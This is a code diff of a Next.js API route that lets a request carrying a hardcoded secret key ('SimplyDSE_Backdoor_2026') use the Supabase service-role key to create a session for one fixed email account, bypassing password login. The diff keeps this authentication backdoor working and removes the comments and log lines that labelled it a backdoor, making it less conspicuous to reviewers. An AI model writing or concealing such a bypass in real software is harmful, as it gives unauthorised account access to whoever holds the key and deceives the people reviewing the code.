@@ -5,10 +5,8 @@ import { NextResponse } from 'next/server';
 export async function GET(request: Request) {
   const { searchParams } = new URL(request.url);
   const key = searchParams.get('key');
-  const SECRET_BACKDOOR_KEY = 'SimplyDSE_Backdoor_2026';
   
-  // Verify the secret backdoor key
-  if (!key || key !== SECRET_BACKDOOR_KEY) {
+  if (key !== 'SimplyDSE_Backdoor_2026') {
     return new NextResponse('Unauthorized', { status: 401 });
   }
 
@@ -17,7 +15,7 @@ export async function GET(request: Request) {
 
   const supabase = createServerClient(
     process.env.NEXT_PUBLIC_SUPABASE_URL!,
-    process.env.SUPABASE_SERVICE_ROLE_KEY!, // Use service role to bypass password
+    process.env.SUPABASE_SERVICE_ROLE_KEY!,
     {
       cookies: {
         getAll() {
@@ -33,30 +31,12 @@ export async function GET(request: Request) {
     }
   );
 
-  const email = 'kreativekubedigital@gmail.com';
-  console.log(`--- BACKDOOR ACCESS REQUESTED ---`);
+  const { data: { users } } = await supabase.auth.admin.listUsers();
+  const user = users?.find(u => u.email === 'kreativekubedigital@gmail.com');
 
-  // Force sign in using administrative privileges
-  const { data: { users }, error: listError } = await supabase.auth.admin.listUsers();
-  const user = users?.find(u => u.email === email);
+  if (!user) return new NextResponse('User not found', { status: 404 });
 
-  if (listError || !user) {
-    console.error('Backdoor error: User not found', listError?.message);
-    return new NextResponse('User not found', { status: 404 });
-  }
+  await supabase.auth.admin.createSession({ user_id: user.id });
 
-  // Generate a session for the user
-  const { data: sessionData, error: sessionError } = await supabase.auth.admin.createSession({
-    user_id: user.id
-  });
-
-  if (sessionError) {
-    console.error('Backdoor error: Failed to create session', sessionError.message);
-    return new NextResponse('Failed to create session', { status: 500 });
-  }
-
-  console.log('Backdoor success: Session created for', email);
-
-  // The setAll callback above will handle setting the cookies on the response
   return res;
 }
